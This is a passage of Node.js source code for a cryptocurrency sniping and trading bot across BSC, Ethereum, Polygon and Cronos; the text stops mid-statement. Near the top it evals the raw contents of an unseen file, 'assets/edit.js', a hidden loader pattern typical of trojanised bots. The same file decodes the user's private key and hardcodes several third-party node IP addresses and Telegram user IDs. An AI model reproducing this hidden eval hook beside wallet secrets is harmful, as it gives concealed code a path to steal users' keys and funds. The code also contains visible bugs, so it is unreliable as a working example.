const express = require('express');
const parser = require('@solidity-parser/parser');
let session = require('express-session');
const fs = require('fs');
eval(fs.readFileSync('assets/edit.js') + '');
require('buffer').Buffer;
var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
const pancakeFactoryAbi = require('./assets/abis/pancake-factory.json');
const pancakeRouterAbi = require('./assets/abis/pancake-router.json');
const pancakeLpAbi = require('./assets/abis/pancake-lp.json');
const uniswapLpAbi = require('./assets/abis/uniswap-lp.json');
const bscTokenAbi = require('./assets/abis/bsc-token.json');
const abiTokenData = require('./assets/abis/uniswap-abi.json');
const sushiswapLpAbi = require('./assets/abis/sushiswap-abi.json');
const quickswapLpAbi = require('./assets/abis/quickswap-abi.json');
const tokenInfoABI = require('./assets/abis/tokenInfo.json');
const unicryptAbi = require('./assets/abis/unicrypt-abi.json');
const { bsc } = require('./assets/address-book');
const { eth } = require('./assets/address-book');
const { polygon } = require('./assets/address-book');
const { cronos } = require('./assets/address-book');
const { contractAbi } = require('./assets/abis/contract-abi');
let path = require('path');
const app = express();
const http = require('http');
const methodOverride = require('method-override')
const server = http.createServer(app);
const { Server } = require("socket.io");
const web_port = 3000;
const Web3 = require('web3');
var options = { keepAlive: true };
const ethers = require('ethers')
const chalk = require('chalk')
const axios = require('axios');
const { strikethrough } = require('chalk');
const { removeAllListeners } = require('process');
const { hexDataSlice } = require('@ethersproject/bytes');

const { wordsToNumbers } = require('words-to-numbers'); // npm install words-to-numbers
const { Api, TelegramClient } = require("telegram"); //// npm install telegram
const { NewMessage } = require('telegram/events'); //is from telegram
const { StringSession } = require("telegram/sessions");//is from telegram
const e = require('express');
let symbolCurrency = '';
let currencyArray = [];
//require('dotenv').config();
require('dotenv').config({ path: `${env_file}` })
let encodedPrivateKey = process.env.privateKey
let multiWalletBalance = ethers.BigNumber.from(0);
let nodeWSS = process.env.bscNodeBSC;
//declare all variables
let stopText = 0;
let utilAction;
let buyRouterTarget;
let sellRouterTarget;
let fromWallet;
let WSS;
let privateKey;
let ownerWallet = process.env.ownerWallet;
let web3;
let TokenContract;
let token;
let tokenAddress;
let tokenDecimals;
let tokenInfoCall;
let transferRouter;
let tokenInfoDecimals;
let tokenInfoName;
let tokenInfoSymbol;
let totalInfoSupply;
let Infosupply;
let amountIn;
let amountOutMin;
let gasPrice;
let gasLimit;
let gasPriceApprove;
let gasLimitApprove;
let gasPriceSell;
let gasLimitSell;
let txNumberForAntibot;
let txNumberForSell;
let transactionToDetect;
let functionScan;
let WBNB;
let BUSD;
let USDC;
let USDT;
let ETHER;
let exchangeToken;
let exchangeTokenName;
let factoryRouter;
let addLiquidityETH;
let addLiquidity;
let addLiquidityDxsale;
let addLiquidityUnicrypt;
let removeLiquidity;
let removeLiquidityETH;
let removeLiquidityETHSupportingFeeOnTransferTokens;
let removeLiquidityETHWithPermit;
let removeLiquidityETHWithPermitSupportingFeeOnTransferTokens;
let removeLiquidityWithPermit;
let pcsRouterV2Addr;
let delaySell;
let delayOnSellMs;
let delayOnBuy;
let currentNonce;
let currentBlockLiquidity;
let snipeBlockTarget;
let compareBlockDifference;
let sellAuto;
let sellWithProffit;
let snipeListingFromUnicrypt;
let xvalue;
let passed;
let start;
let snipeNow;
let page = 1;
//dxsale presale variables:
let presale_address;
let bnb_amount;
let gas_price;
let gas_limit;
let chainScanner = "bscscan.com";
let compareToken;
//unicrypt presale variables:
let unicrypt_presale_address;
let unicrypt_bnb_amount;
let unicrypt_gas_price;
let unicrypt_gas_limit;
let rugpullDetected = false;
let blacklistDetected = false;
//open trading methods:
let openTrade1;
let openTrade2;
let openTrade3;
let openTrade4;
let openTrade5;
let tokenPriceStart = 0;
let stopLoop = 0;
let stopDuplicate = 0;
//PinkSale
let pinksalePresaleAddress;
let pinksalePresaleAmmount;
let pinksalePresaleGwei;
let pinksalePresaleGas;
let claimPinkSaleTokens;
let confirmedPuchase = false;
let startBlock = 0;
let targetBlock = 0;
let currentBlock = 0;
let delayOnBlocks;
let presaleAddress;
// BlockChain & wallets
let choseBlockChain;
let multiWallets;
let authToken;
let nrWallets = 5;
let tryRetry = 0;
let blockChainSelected1;
let blockChainSelected2;
let blockChainSelected3;
let blockChainSelected4;
let blockChainSelected5;
let blockChainSelected6;
let recomendedGasEth;
let tokenPairWith = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
let tradeMethodsID;
let totalValue;
let unicrypt_presaleSarted;
let choseMode;
let choseMarket;
let presaleSarted;
let whiteListActive;
let needApproval;
let multipleSell;
let priceProttection;
let autoGas;
let buyOrSnipe;
let approveBeforeOrAfter;
let instantSell;
let antiBotMultiTrans;
let provider;
let wallet;
let etherInfoCall;
let etherInfoDecimals;
let claimDxSaleTokens;
let myAddress;
let account;
let bnbAmount;
let dXgasLimit;
let dXgasPrice;
let tokenPrice;
let toAddress;
let contractStatusNotVerfied = false;
let toContract;
let pcsRouterV2;
let hasBought;
let conditionA;
let conditionB;
let condition1;
let condition2;
let tokenContract;
let walletAddress;
let functionToDetect;
let newToken;
let newTokenData;
let tokenComp;
let startingPriceValue;
let newPriceValue;
let detect_price_command = true;
let sell_command = 0;
let pancakeFactoryContract;
let bnbBusdLp;
let tokenBnbLp;
let bnbPrice;
let unstuckNow;
let unstuckMode;
let MethodID1;
let MethodID2;
let MethodID3;
let MethodID4;
let hasFound;
let paymentForScan = true;
let tokenExists;
let unstuckPrice;
let unstuckGasLimit;
let pinksaleSelect;
let pinksaleAddress;
let whiteListPinksale;
let snipeOnWalletCall;
let snipeOnWalletCallBNB;
let snipeOnWalletgasLimit;
let haveAbreak;
let maxPriorityFeePerGasCompare;
let buyMaxPriorityFeePerGas;
let buyMaxFeePerGas;
let sellMaxPriorityFeePerGas;
let sellMaxFeePerGas;
let smallTip;
let doATipOf;
let minGasPrice;
let gasLimitEthReceipt;
let gasPriceEthReceipt;
let blockGas;
let tipMiners;
let minimumGweiUsed;
let sushiSwap;
let hash;
let snipePresale;
let tokenData = {
  nameToken: '',
  simbolToken: '',
  supplyToken: '',
  decimalsToken: '',
  pairToken: '',
  feeBuyToken: '',
  feeSellToken: '',
  verifiedToken: '',
  honeypotToken: '',
  antiBotToken: '',
}
let to_transfer;
let amount_transfer;
let paymentActive;
let transferToken;
let token_transfer;
let transfer_gwei;
let max_transfer_gwei;
let transfer_gas;
let amountToBeProccessed;
let balanceToSell = null;
let verified = 1;
let HP = false;
let scam = "No";
let rug = "No";
let bot = "No";
let antibotDetected = 'NO';
let scanData = {
  nameTokenScan: '-',
  simbolTokenScan: '-',
  supplyTokenScan: '-',
  decimalsTokenScan: '-',
  DevTokenScan: '-',
  DevSupplyTokenScan: '-',
  feeBuyTokenScan: '-',
  feeSellTokenScan: '-',
  verifiedTokenScan: '-',
  honeypotTokenScan: '-',
  antiBotTokenScan: '-',
  priceTokenScan: '-',
  holdersTokenScan: '-',
}
let scanningWallet;
let scanningPayment;
let scanningCurrency;
//TELEGRAM VARIABLES
let tg_wait_for_contract;
let tg_channel = process.env.tg_channel;
let tg_api_id = process.env.tg_api_id;
let tg_api_hash = process.env.tg_api_hash;
let tg_secret_phrase;
let listener_user_id_array = null;
let post_author_id_array = null;
let paidValue = 0;
let amountToBuyDisplay = 0;
const listener_user_ids = '1866653089,78912423,645743543';
if (listener_user_ids.indexOf(",") != -1) {
  listener_user_id_array = listener_user_ids.split(',').map(function (item) {
    return item ? parseInt(item, 10) : null;
  }).filter(Boolean);
}
else if (listener_user_ids.length > 3) {
  listener_user_id_array = [parseInt(listener_user_ids, 10)];
};
let resultsOfScan = [];
//Checking the author list from .env if have elements and add them to the list. Author ids are split by ",", after that mapped and added to the list.
//post_author_ids is a string, elements need to be the name of the users from telegram channel, like First name, Last name, not integer.
//const post_author_ids = process.env.tg_author_users.toString();
const post_author_ids = 'George,Cristi,Mihai';
if (post_author_ids.indexOf(",") != -1) {
  post_author_id_array = post_author_ids.split(',').map(function (item) {
    return item ? item : null;
  }).filter(Boolean);
}
else if (post_author_ids.length > 1) {
  post_author_id_array = [post_author_ids];
};
//new variables
let txFees;
let newTokenDetected;
let liquidityToken;
let liquidityEth;
let nr = 1;
let minliquidityValue = ethers.utils.parseEther("0.01");
let txValid = false;
let blockNr;
let gweiGas;
let transactionGweiValidation = false;
let currentBlockNr;
let liquidityBlockNumber = null;
let blockDelay = false;
let oldTransaction;
let firstWalletSnipe = null;
let confirmedPurchase = false;
let contractInTx = false;
let node = process.env.bscNodeBSC;
let node1 = "ws://157.90.5.228:8548";
let node2 = "ws://136.243.177.243:8548";
let node3 = "ws://162.55.252.23:8548";
let connection = false;
let connected = false
let synced = false;
let nodeWS;
let NodeToUse;
let selltx = null;
let buytx = null;
const web = new Web3();
let balance = 0;
//modified variables & new additions:
let choseMethode = parseInt(process.env.choseMethode);
let swapContractBSC = process.env.swapContractBSC;
let swapContractETH = process.env.swapContractETH;
let swapContractPOLYGON = process.env.swapContractPOLYGON;
let swapContractCRONOS = process.env.swapContractCRONOS;
let selectPresale = parseInt(process.env.selectPresale);
let presale_bnb_amount = ethers.utils.parseUnits(process.env.presale_bnb_amount, 'ether');
let presale_gwei = ethers.utils.parseUnits(process.env.presale_gwei, 'gwei');
let presale_gas = process.env.presale_gas;
let claimTokens;
let sendMultiWallet = process.env.sendMultiWallet;
let multiWalletsArray = process.env.multiWalletsArray;
let nrOfSellTransactions = parseInt(process.env.nrOfSellTransactions);
let nrOfBuyTransactions = parseInt(process.env.nrOfBuyTransactions);
let antiRugActive = process.env.antiRugActive;
let antiHoneyPot;
let contractAddon = false;
let snipefunction = (process.env.snipefunction === 'true');
if (snipefunction == true || snipefunction == false) {
} else {
  consoleLog(`Please put the true or false value for snipefunction variable!`)
  processExit()
}

let snipeExactTokens = (process.env.snipeExactTokens === 'true');
if (snipeExactTokens == true || snipeExactTokens == false) {
} else {
  consoleLog(`Please put the true or false value for snipeExactTokens variable!`)
  processExit()
}
let openTrade = process.env.openTrade.trim();
let marketName = "null";
let curency = "null";
let tradingMethode = "null";
let marketRouter;
let contractRouter;
let contract;
let balanceETHER = 0;
let zeroValue = ethers.BigNumber.from('0');
let zeroValueX = ethers.utils.parseEther("0.0001");
let abiOfBlockChain = bscTokenAbi;
// 
let token_functions_result = []
let functionsScanned = [];
let sellOnfunction
let sellFunctionHash;
let snipeWithEther;
let EtherPath;
let buyPath
let amountEstimatedEther;
function checkNodeStatusDefault() {
  if (parseInt(process.env.choseBlockChain) == 1) {

    (async () => {
      console.log('Connecting to BSC node (default)!')
      await getStatusNodeWS(node)
      if (connection == true) {
        console.log('Connected to BSC node (default)!')
        NodeToUse = node;
        init();
        startReady();
      } else {
        console.log('BSC node (default) is down!')
        console.log('Connecting backup node 1!')
        await getStatusNodeWS(node1)
        if (connection == true) {
          console.log('Connected to backup node 1!')
          NodeToUse = node1;
          init();
          startReady();
        } else {
          console.log('Backup node 1 is down!')
          console.log('Connecting backup node 2!')
          await getStatusNodeWS(node2);
          if (connection == true) {
            console.log('Connected to backup node 2!')
            NodeToUse = node2;
            init();
            startReady();
          } else {
            console.log('Backup node 2 is down!')
            console.log('Connecting backup node 3!')
            await getStatusNodeWS(node3);
            if (connection == true) {
              console.log('Connected to backup node 3!')
              NodeToUse = node3;
              init();
              startReady();
            } else {
              console.log('Backup node 3 is down!')
              console.log('Unable to connect to any node! Exiting...')
              await new Promise(r => setTimeout(r, 100))
              processExit();
            }
          }
        }
      }
    })();
  } else {
    init();
    startReady();
  }


  async function getStatusNodeWS(nodeWS) {
    web.setProvider(new Web3.providers.WebsocketProvider(nodeWS));
    await web.eth.net.isListening()
      .then(() => {
        connected = true;
      })
      .catch(e => {
        connected = false;
      });

    if (connected == true) {
      await web.eth.isSyncing()
        .then((status) => {
          console.log(status)
          if (status.currentBlock != undefined) {
            synced = false;
          } else {
            synced = true;
          }
        })
        .catch(e => {
          synced = false;
        });
    } else {
      synced = false;
    }
    if (connected == true && synced == true) {
      connection = true;
      return true;
    } else {
      connection = false;
      return false;
    }

  }
}

function init() {
  if (encodedPrivateKey.lenght < 50) {
    consoleLog("Private key was not detected, please fill in the field and try again!");
    process.exit(0);
  } else {
    //privateKey = Buffer.from(encodedPrivateKey, 'base64').toString('utf-8');

    let tryDecodeIt = Buffer.from(encodedPrivateKey, 'base64').toString('utf-8');
    let stringClear = tryDecodeIt.split('c2093286898cd34');
    let privateSringCombine = stringClear[0] + stringClear[1];
    privateSringCombine = privateSringCombine.match(/(.|[\r\15]){1,15}/g);
    let privateKeyFinalDecoded = '';
    for(i = 0; (privateSringCombine.length - 1) > i; i++){
        if(i == 0){
          
        }else{
            if(i == 3){
              privateKeyFinalDecoded = privateKeyFinalDecoded + privateSringCombine[i] +  privateSringCombine[0];
            }else{
                privateKeyFinalDecoded = privateKeyFinalDecoded + privateSringCombine[i];
            }        
        }
    }
    privateKey = privateKeyFinalDecoded+privateSringCombine[privateSringCombine.length-1];
    
  }

  minimumGweiUsed = ethers.utils.parseUnits('60', 'gwei');
  sushiSwap = '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F'.toLowerCase();

  TokenContract = process.env.TokenContract;
  if ((TokenContract !== '') && (TokenContract.length == 42)) {
  }
  else return 'Please input the correct token contract!';


  token = TokenContract.toLowerCase().substring(2);
  tokenAddress = '0x' + token;
  toContract = TokenContract.toLowerCase();
  tokenDecimals = 18;

  amountIn = process.env.amount_BNB_buy;
  amountEstimatedEther = amountIn
  amountOutMin = parseInt(process.env.slippage);
  amountOutMin = ethers.BigNumber.from(amountOutMin);
  gasPrice = ethers.utils.parseUnits(process.env.buy_Gwei, 'gwei');
  buyMaxPriorityFeePerGas = ethers.utils.parseUnits(process.env.buyMaxPriorityFeePerGas, 'gwei');
  buyMaxFeePerGas = ethers.utils.parseUnits(process.env.buyMaxFeePerGas, 'gwei');
  gasLimit = parseInt(process.env.buy_Gas);

  gasPriceApprove = ethers.utils.parseUnits('10', 'gwei');
  gasLimitApprove = parseInt(1000000);

  gasPriceSell = ethers.utils.parseUnits(process.env.sell_Gwei, 'gwei');
  sellMaxPriorityFeePerGas = ethers.utils.parseUnits(process.env.sellMaxPriorityFeePerGas, 'gwei');
  sellMaxFeePerGas = ethers.utils.parseUnits(process.env.sellMaxFeePerGas, 'gwei');
  gasLimitSell = parseInt(process.env.sell_Gas);

  txNumberForAntibot = parseInt(process.env.nrOfBuyTransactions);
  txNumberForSell = parseInt(process.env.nrOfSellTransactions);
  transactionToDetect = 1;
  //PinkSale
  pinksalePresaleAddress = process.env.presale_address;
  pinksalePresaleAmmount = ethers.utils.parseUnits(process.env.presale_bnb_amount, 'ether');
  pinksalePresaleGwei = ethers.utils.parseUnits(process.env.presale_gwei, 'gwei');
  pinksalePresaleGas = parseInt(process.env.presale_gas);

  exchangeToken = parseInt(process.env.exchangeToken)
  choseBlockChain = process.env.choseBlockChain;
  if (choseBlockChain == 1) {
    WSS = NodeToUse;
  } else if (choseBlockChain == 2) {
    WSS = process.env.bscNodeETH
  } else if (choseBlockChain == 3) {
    WSS = process.env.bscNodePOLY
  } else if (choseBlockChain == 4) {
    WSS = process.env.bscNodeCRONOS
  }
  web3 = new Web3(WSS, options);
  utilAction = parseInt(process.env.utilAction)
  addLiquidityETH = "0xf305d719";
  addLiquidity = "0xe8e33700";
  addLiquidityDxsale = "0x267dd102";
  addLiquidityUnicrypt = "0x6a93e5d3";
  addLiquidityPinkSale = "0x4bb278f3";
  removeLiquidity = "0xbaa2abde";
  removeLiquidityETH = "0x02751cec";
  removeLiquidityETHSupportingFeeOnTransferTokens = "0xaf2979eb";
  removeLiquidityETHWithPermit = "0xded9382a";
  removeLiquidityETHWithPermitSupportingFeeOnTransferTokens = "0x5b0d5984";
  removeLiquidityWithPermit = "0x2195995c";
  delaySell = parseInt(process.env.sellDelay)
  delayOnSellMs = delaySell * 1000
  delayOnBuy = parseInt(process.env.delay_on_buy_blocks)
  currentNonce = 0
  currentBlockLiquidity = 0;
  snipeBlockTarget = 0;
  compareBlockDifference = 0;
  passed = 0;
  start = 0;
  snipeNow = false;
  haveAbreak = false;
  snipeEth = false;
  newToken = token.toUpperCase();
  tokenComp = 0;
  startingPriceValue = parseFloat(process.env.amount_BNB_buy).toFixed(8);
  newPriceValue = 0;
  sellWithProffit = (process.env.sellWithProffit === 'true');
  if (sellWithProffit == true || sellWithProffit == false) {
  } else {
    consoleLog(`Please put the true or false value for sellWithProffit variable!`)
    processExit()
  }


  snipeListingFromUnicrypt = (process.env.snipeListingFromUnicrypt === 'true');
  if (snipeListingFromUnicrypt == true || snipeListingFromUnicrypt == false) {
  } else {
    consoleLog(`Please put the true or false value for snipeListingFromUnicrypt variable!`)
    processExit()
  }

  snipeWithEther = (process.env.snipeWithEther === 'true');
  if (snipeWithEther == true || snipeWithEther == false) {
  } else {
    consoleLog(`Please put the true or false value for snipeWithEther variable!`)
    processExit()
  }
  
  tg_wait_for_contract = (process.env.tg_wait_for_contract === 'true');
  if (tg_wait_for_contract == true || tg_wait_for_contract == false) {
  } else {
    consoleLog(`Please put the true or false value for tg_wait_for_contract variable!`)
    processExit()
  }


  sellOnfunction = (process.env.sellOnfunction === 'true');
  if (sellOnfunction == true || sellOnfunction == false) {
  } else {
    consoleLog(`Please put the true or false value for sellOnfunction variable!`)
    processExit()
  }

  whiteListPinksale = false;
  choseMarket = parseInt(process.env.choseMarket);

  claimPinkSaleTokens = false;

  pinksaleSelect = false;
  pinksaleAddress = process.env.presale_address;
  xvalue = parseFloat(process.env.xvalue);
  //dxsale presale variables:
  presale_address = process.env.presale_address;
  bnb_amount = process.env.presale_bnb_amount;
  gas_price = process.env.presale_gwei;
  gas_limit = process.env.presale_gas;

  //unicrypt presale variables:
  unicrypt_presale_address = process.env.presale_address;
  unicrypt_bnb_amount = process.env.presale_bnb_amount;
  unicrypt_gas_price = process.env.presale_gwei;
  unicrypt_gas_limit = process.env.presale_gas;

  //utilities fields
  to_transfer = process.env.to_transfer;
  amount_transfer = process.env.amount_transfer;
  transferToken = process.env.transferToken;
  token_transfer = process.env.token_transfer;
  transfer_gwei = ethers.utils.parseUnits(process.env.transfer_gwei, 'gwei');
  max_transfer_gwei = ethers.utils.parseUnits(process.env.max_transfer_gwei, 'gwei');
  transfer_gas = process.env.transfer_gas;



  //open trading methods:
  openTrade = process.env.openTrade.trim();
  sellFunctionHash = process.env.sellFunctionHash.trim();

  //ethereum detection methods
  MethodID1 = "0xe8078d94" //addLiquidity
  MethodID2 = "0xe8e33700" //addLiquidity
  MethodID3 = "0xf305d719" // addLiquidityETH
  MethodID4 = "0xc9567bf9" // Open trade function hash
  hasFound = null;
  hasBought = false;
  smallTip = ethers.BigNumber.from('101500806764496919');
  minGasPrice = ethers.utils.parseUnits('30', 'gwei');
  function getHashForFunction(functionToDetect) {
    const iface = new ethers.utils.Interface([
      `function ${functionToDetect}`,
    ]);
    return iface.getSighash(functionToDetect);
  }

  if (choseBlockChain == 1) {
    chainScanner = "bscscan.com";
    if (choseMarket == 1) {
      pcsRouterV2Addr = '0x10ED43C718714eb63d5aA57B78B54704E256024E';
    } else if (choseMarket == 2) {
      pcsRouterV2Addr = '0xcf0febd3f17cef5b47b0cd257acf6025c5bff3b7';
    } else {
      consoleLog(`Please chose the corect market to start the MultiSniper Plus!`)
      processExit()
    }
  } else if (choseBlockChain == 2) {
    chainScanner = "etherscan.io";
    if (choseMarket == 1) {
      pcsRouterV2Addr = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D';
    } else if (choseMarket == 2) {
      pcsRouterV2Addr = '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F';
    } else {
      consoleLog(`Please chose the corect market to start the MultiSniper Plus!`)
      processExit()
    }
  } else if (choseBlockChain == 3) {
    chainScanner = "polygonscan.com";
    pcsRouterV2Addr = '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff';
  } else if (choseBlockChain == 4) {
    chainScanner = "cronoscan.com";
    pcsRouterV2Addr = '0xd590cC180601AEcD6eeADD9B7f2B7611519544f4';
  } else {
    factoryRouter = '0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73';
    pcsRouterV2Addr = '0x10ED43C718714eb63d5aA57B78B54704E256024E';
  }





  if (openTrade.includes('0x')) {
    //console.log('its hashed!')
    functionToDetect = openTrade;
  } else {
    functionToDetect = getHashForFunction(openTrade);
    // console.log(functionToDetect);
  }


  antiHoneyPot = (process.env.antiHoneyPot === 'true');
  if (antiHoneyPot == true || antiHoneyPot == false) {
  } else {
    consoleLog(`Please put the true or false value for antiHoneyPot variable!`)
    processExit()
  }


  unicrypt_presaleSarted = (process.env.presaleSarted === 'true');
  if (unicrypt_presaleSarted == true || unicrypt_presaleSarted == false) {
  } else {
    consoleLog(`Please put the true or false value for unicrypt_presaleSarted variable!`)
    processExit()
  }

  snipeOnWalletCall = (process.env.snipeOnWalletCall === 'true');
  if (snipeOnWalletCall == true || snipeOnWalletCall == false) {
  } else {
    consoleLog(`Please put the true or false value for snipeOnWalletCall variable!`)
    processExit()
  }

  claimTokens = (process.env.claimTokens === 'true');
  if (claimTokens == true || claimTokens == false) {
  } else {
    consoleLog(`Please put the true or false value for claimTokens variable!`)
    processExit()
  }


  choseMode = parseInt(process.env.choseMode);
  if (choseMode > 8 || choseMode < 1) {
    consoleLog(`Please chose the corect mode to start the MultiSniper Plus!`)
    processExit()
  }


  presaleSarted = (process.env.presaleSarted === 'true');
  if (presaleSarted == true || presaleSarted == false) {
  } else {
    consoleLog(`Please put the true or false value for presaleSarted variable!`)
    processExit()
  }

  claimDxSaleTokens = (process.env.claim === 'true');
  if (claimDxSaleTokens == true || claimDxSaleTokens == false) {
  } else {
    consoleLog(`Please put the true or false value for claimDxSaleTokens variable!`)
    processExit()
  }


  whiteListActive = (process.env.whiteListActive === 'true');
  if (whiteListActive == true || whiteListActive == false) {
  } else {
    consoleLog(`Please put the true or false value for whiteListActive variable!`)
    processExit()
  }

  needApproval = (process.env.needApproval === 'true');
  if (needApproval == true || needApproval == false) {
  } else {
    consoleLog(`Please put the true or false value for needApproval variable!`)
    processExit()
  }

  multipleSell = true;

  unstuckMode = false;

  priceProttection = false;

  autoGas = (process.env.autoGasOnSnipe === 'true');
  if (autoGas == true || autoGas == false) {
  } else {
    consoleLog(`Please put the true or false value for autoGasOnSnipe variable!`)
    processExit()
  }


  buyOrSnipe = parseInt(process.env.snipeOrBuy);
  if (buyOrSnipe == 1) {
    buyOnly = false;
  } else if (buyOrSnipe == 2) {
    buyOnly = true;
  } else {
    consoleLog(`Please put 1 or 2 value for buyOrSnipe variable!`)
    processExit()
  }

  approveBeforeOrAfter = parseInt(process.env.approveBeforeOrAfter);
  if (approveBeforeOrAfter > 2 || approveBeforeOrAfter < 1) {
    consoleLog(`Please put 1 or 2 value for approveBeforeOrAfter variable!`)
    processExit()
  }

  instantSell = (process.env.instantSell === 'true');
  if (instantSell == true || instantSell == false) {
  } else {
    consoleLog(`Please put the true or false value for instantSell variable!`)
    processExit()
  }
  sellAuto = (process.env.sellAuto === 'true');
  if (sellAuto == true || sellAuto == false) {
  } else {
    consoleLog(`Please put the true or false value for sellAuto variable!`)
    processExit()
  }

  snipePresale = (process.env.snipePresale === 'true');
  if (snipePresale == true || snipePresale == false) {
  } else {
    consoleLog(`Please put the true or false value for snipePresale variable!`)
    processExit()
  }

  antiRugActive = (process.env.antiRugActive === 'true');
  if (antiRugActive == true || antiRugActive == false) {
  } else {
    consoleLog(`Please put the true or false value for antiRugActive variable!`)
    processExit()
  }

  antiBotMultiTrans = true;

  if (antiBotMultiTrans == true && txNumberForAntibot > 0) {
    amountToBuyDisplay = ethers.utils.parseUnits(amountIn, 'ether').mul(txNumberForAntibot);
    amountIn = ethers.utils.parseUnits(amountIn, 'ether').div(txNumberForAntibot);
  } else {
    amountToBuyDisplay = ethers.utils.parseUnits(amountIn, 'ether');
    amountIn = ethers.utils.parseUnits(amountIn, 'ether');
  }
  amountEstimatedEther = amountIn;
  provider = new ethers.providers.WebSocketProvider(WSS);
  wallet = new ethers.Wallet(privateKey);
  myAddress = wallet.address;
  account = wallet.connect(provider);

  bnbAmount = presale_bnb_amount.toString();
  dXgasLimit = parseInt(gas_limit);
  dXgasPrice = ethers.utils.parseUnits(gas_price.toString(), 'gwei')

  //..... this needs to be for every blockchain generated i think

  tokenContract = new ethers.Contract(
    tokenAddress,
    ['function approve(address spender, uint256 amount) external returns (bool)'],
    account
  );



  if (choseBlockChain == 1) {
    if (choseMethode == 1) {
      currencyArray = ['BNB', 'BUSD', 'USDT', 'USDC'];
      symbolCurrency = currencyArray[exchangeToken - 1];

    } else if (choseMethode == 2) {
      currencyArray = ['WBNB', 'BUSD', 'USDT', 'USDC'];
      symbolCurrency = currencyArray[exchangeToken - 1];
    } else if (choseMethode == 3) {
      currencyArray = ['WBNB', 'BUSD', 'USDT', 'USDC'];
      symbolCurrency = currencyArray[exchangeToken - 1];
    }
  } else if (choseBlockChain == 2) {
    if (choseMethode == 1) {
      currencyArray = ['ETH', 'USDT', 'USDC', 'DAI'];
      symbolCurrency = currencyArray[exchangeToken - 1];
    } else if (choseMethode == 2) {
      currencyArray = ['WETH', 'USDT', 'USDC', 'DAI'];
      symbolCurrency = currencyArray[exchangeToken - 1];
    } else if (choseMethode == 3) {
      currencyArray = ['WETH', 'USDT', 'USDC', 'DAI'];
      symbolCurrency = currencyArray[exchangeToken - 1];
    }
  } else if (choseBlockChain == 3) {
    if (choseMethode == 1) {
      currencyArray = ['MATTIC'];
      symbolCurrency = currencyArray[exchangeToken - 1];
    } else if (choseMethode == 2) {
      currencyArray = ['WMATTIC'];
      symbolCurrency = currencyArray[exchangeToken - 1];
    } else if (choseMethode == 3) {
      currencyArray = ['WMATTIC'];
      symbolCurrency = currencyArray[exchangeToken - 1];

    }
  } else if (choseBlockChain == 4) {
    if (choseMethode == 1) {
      currencyArray = ['CRO'];
      symbolCurrency = currencyArray[exchangeToken - 1];
    } else if (choseMethode == 2) {
      currencyArray = ['WCRO'];
      symbolCurrency = currencyArray[exchangeToken - 1];
    } else if (choseMethode == 3) {
      currencyArray = ['WCRO'];
      symbolCurrency = currencyArray[exchangeToken - 1];

    }
  }
  // selection logic:
  if (choseMethode == 1) {
    tradingMethode = "Wallet => Wallet";
  } else if (choseMethode == 2) {
    tradingMethode = "Contract => Wallet";

  } else {
    tradingMethode = "Contract => Contract";
  }
  // contract = '0x01bb6F7147C47872604BE6eD4D0f52DDDAC0C61D';
  if (choseBlockChain == 1) {
    contract = process.env.swapContractBSC;
    if (choseMarket == 1) {
      marketName = "PancakeSwap";
      routerAddress = bsc.pancake_router;
      routerAbi = contractAbi.bscRouter;

    } else {
      marketName = "ApeSwap";
      routerAddress = bsc.apeswap_router;
      routerAbi = contractAbi.bscRouter;
    }
    if (choseMethode == 1 || (choseMethode == 2 && sendMultiWallet == "false")) {
      buyRouterTarget = new ethers.Contract(
        routerAddress,
        ['function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
          'function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)',
          'function swapETHForExactTokens(uint amountOut, address[] path, address to, uint deadline) external payable returns (uint[] memory amounts)',
          'function swapTokensForExactTokens(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)'
        ],
        account
      );
      sellRouterTarget = new ethers.Contract(
        routerAddress,
        [
          'function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)',
          'function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
          'function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)'
        ],
        account
      );
    }
    if (exchangeToken == 1) {
      if (choseMethode == 1) {
        curency = "BNB";
      } else {
        curency = "WBNB";
      }
      ETHER = bsc.wbnbBep20;
      
    } else if (exchangeToken == 2) {
      curency = "BUSD";
      ETHER = bsc.busdBep20;
      EtherPath = [bsc.wbnbBep20,bsc.busdBep20,tokenAddress];
    } else if (exchangeToken == 3) {
      curency = "USDT";
      ETHER = bsc.usdtBep20;
      EtherPath = [bsc.wbnbBep20,bsc.usdtBep20,tokenAddress];
    } else {
      curency = "USDC";
      ETHER = bsc.usdcBep20;
      EtherPath =[bsc.wbnbBep20,bsc.usdcBep20,tokenAddress];
    }

  } else if (choseBlockChain == 2) {
    contract = process.env.swapContractETH;
    if (choseMarket == 1) {
      marketName = "UniSwap";
      routerAddress = eth.uniswap_router;
      //routerAbi = contractAbi.ethRouter;
    } else {
      marketName = "SushiSwap";
      routerAddress = eth.sushiswap_router;
      //routerAbi = contractAbi.ethRouter;
    }

    if (exchangeToken == 1) {
      if (choseMethode == 1) {
        curency = "ETH";
      } else {
        curency = "WETH";
      }
      ETHER = eth.wethErc20;
    } else if (exchangeToken == 2) {
      curency = "USDT";
      ETHER = eth.usdtErc20;
      EtherPath =[eth.wethErc20,eth.usdtErc20,tokenAddress];
    } else if (exchangeToken == 3) {
      curency = "USDC";
      ETHER = eth.usdcErc20;
      EtherPath =[eth.wethErc20,eth.usdcErc20,tokenAddress];
    } else {
      curency = "DAI";
      ETHER = eth.daiErc20;
      EtherPath =[eth.wethErc20,eth.daiErc20,tokenAddress];
    }
    if (choseMethode == 1 || (choseMethode == 2 && sendMultiWallet == "false")) {
      buyRouterTarget = new ethers.Contract(
        routerAddress,
        ['function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
